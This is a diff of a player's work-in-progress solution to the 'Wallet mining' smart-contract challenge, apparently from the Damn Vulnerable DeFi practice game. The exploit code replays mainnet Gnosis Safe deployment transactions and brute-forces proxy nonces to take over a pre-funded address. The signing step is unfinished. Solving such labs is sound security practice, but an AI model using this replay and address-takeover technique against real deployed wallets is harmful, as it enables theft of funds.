@@ -69,75 +69,118 @@ describe('[Challenge] Wallet mining', function () {
         /** CODE YOUR SOLUTION HERE */
 
         //  Data from https://github.com/safe-global/safe-singleton-factory/blob/main/artifacts/31337/deployment.json
-        const GNOSIS_SINGLETON_DEPLOYMENT_INFO = {
-            "gasPrice": 100000000000,
-            "gasLimit": 100000,
-            "signerAddress": "0xE1CB04A0fA36DdD16a06ea828007E35e1a3cBC37",
-            "transaction": "0xf8a78085174876e800830186a08080b853604580600e600039806000f350fe7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf382f4f5a00dc4d1d21b308094a30f5f93da35e4d72e99115378f135f2295bea47301a3165a0636b822daad40aa8c52dd5132f378c0c0e6d83b4898228c7e21c84e631a0b891",
-            "address": "0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7"
-        }
-
+        const data = require("./data.json");
+        console.log("Player address is", player.address)
+        
         const attackWalletDeployer = walletDeployer.connect(player);
         const attackAuthorizer = authorizer.connect(player);
 
         const fn = attackAuthorizer.interface.getSighash("can(address,address)");
         // console.log(fn);
 
-        // const attackFactory = await ethers.getContractFactory("AttackWalletMiner", player);
-        // const c = await attackFactory.deploy();
-
-        // await c.deploySafe();
-
         // Transfer funds to deploying address
         const tx = {
-            to: GNOSIS_SINGLETON_DEPLOYMENT_INFO.signerAddress,
+            to: data.REPLAY_DEPLOY_ADDRESS,
             value: ethers.utils.parseEther("1")
         }
         await player.sendTransaction(tx);
 
+        // Replay safe deploy transaction with same data from mainnet
+        // Contract address will equal 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F
+        // https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
+        //  Nonce 0
+        const deploySafeTx = await (await ethers.provider.sendTransaction(data.DEPLOY_SAFE_TX)).wait();
+        const safeContractAddr = deploySafeTx.contractAddress;
+        console.log("Replayed deploy Master Safe Copy at", safeContractAddr);
 
-        // Deploy safe singleton factory for hardhat from
-        // which deploys contract at 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7
-        // https://github.com/safe-global/safe-singleton-factory/blob/main/artifacts/31337/deployment.json
+        // Do same thing but with nonce 1
+        const randomTx = await (await ethers.provider.sendTransaction(data.RANDOM_TX)).wait();
 
-        const txRes = await ethers.provider.sendTransaction(GNOSIS_SINGLETON_DEPLOYMENT_INFO.transaction);
-        const deployerAddr = (await txRes.wait()).contractAddress;
-        console.log("deployer address is", deployerAddr)
+        // Replay factory deploy transaction with same data from mainnet
+        // Contract address will equal 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B 
+        // https://etherscan.io/tx/0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
+        // Nonce 2
+        const deployFactoryTx = await (await ethers.provider.sendTransaction(data.DEPLOY_FACTORY_TX)).wait();
+        const factoryContractAddr = deployFactoryTx.contractAddress;
+        console.log("Replayed deploy safe factory at", factoryContractAddr);
 
-        const gnosisFactory = await ethers.getContractFactory("GnosisSafe", player);
+        const proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", factoryContractAddr, player);
 
+        // Helper function to create ABIs
+        const createInterface = (signature, methodName, arguments) => {
+            const ABI = signature;
+            const IFace = new ethers.utils.Interface(ABI);
+            const ABIData = IFace.encodeFunctionData(methodName, arguments);
+            return ABIData;
+        }
+
+
+        const safeABI = ["function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)",
+                        "function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes calldata signatures)"];
+        const setupABIData = createInterface(safeABI, "setup",  [
+            [player.address],
+            1,
+            ethers.constants.AddressZero,
+            0,
+            ethers.constants.AddressZero,
+            ethers.constants.AddressZero,
+            0,
+            ethers.constants.AddressZero,
+        ])
+
+        // Find how many addresses required to find the missing address of
+        // 0x9b6fb606a9f5789444c17768c6dfcf2f83563801
+        let nonceRequired = 0
+        let address = ""
+        while (address.toLowerCase() != DEPOSIT_ADDRESS.toLowerCase()) {
+            address = ethers.utils.getContractAddress({
+                from: factoryContractAddr,
+                nonce: nonceRequired
+            });
+            nonceRequired += 1;
+        }
+        console.log(`Need to deploy ${nonceRequired} proxies to get access to 20mil`);
+
+        for (let i = 0; i < nonceRequired ; i ++) {
+            await proxyFactory.createProxy(safeContractAddr, setupABIData);
+        }
+
+        const tokenABI = ["function transfer(address to, uint256 amount)"];
+        const tokenABIData = createInterface(tokenABI, "transfer", [player.address, DEPOSIT_TOKEN_AMOUNT]);
+
+        // 1. need to get transaction hash from here https://github.com/safe-global/safe-contracts/blob/v1.1.1/contracts/GnosisSafe.sol#L398
+        // 2. sign transaction hash
+        // 3. send it below
+
+        const execTransactionData = createInterface(safeABI, "execTransaction", [
+            token.address,
+            0,
+            tokenABIData,
+            0,
+            0,
+            0,
+            0,
+            ethers.constants.AddressZero,
+            ethers.constants.AddressZero,
+            // signature here
+
+        ])
+        return;
+
+
+        console.log(await (await proxyFactory.createProxy(safeContractAddr, ABIData)).wait())
+        // proxyFactory.
+
+        for (let i = 0; i < 47; i++) {
+            const ca = ethers.utils.getContractAddress({
+                from: factoryContractAddr,
+                nonce: i
+            })
+            
+            console.log(ca)
+        }
         
-        // Deploying the GnosisSafe must contain the salt prepended to the intialization bytecode.
-        const deployRes = await (await player.sendTransaction({
-            to: deployerAddr,
-            data: ethers.constants.HashZero + gnosisFactory.bytecode.substring(2),
-            gasLimit: 30000000
-        })).wait();
 
-        const gnosisMasteryCopyAddr = ethers.utils.getCreate2Address(deployerAddr, ethers.constants.HashZero, ethers.utils.keccak256(gnosisFactory.bytecode));
-        console.log("Gnosis Address")
-        console.log(gnosisMasteryCopyAddr);
-
-        const deployed = await ethers.getContractAt("GnosisSafe", gnosisMasteryCopyAddr, player);
-
-        console.log(await deployed.VERSION())
-        
-
-
-
-
-
-
-        // Notes:
-        // Looks like the addresses are created from Gnosis Safe 1.1.1
-        // https://github.com/safe-global/safe-deployments/blob/main/src/assets/v1.1.1/gnosis_safe.json
-        // https://github.com/safe-global/safe-deployments/blob/main/src/assets/v1.1.1/proxy_factory.json
-
-        // We should be able to do this with Gnosis deployments to actually get somewhere, but im not sure
-        // how we will be able to put code behind the random address
-        
-
-        // const res = await attackWalletDeployer.can(player.address, DEPOSIT_ADDRESS)
     });
 
     after(async function () {
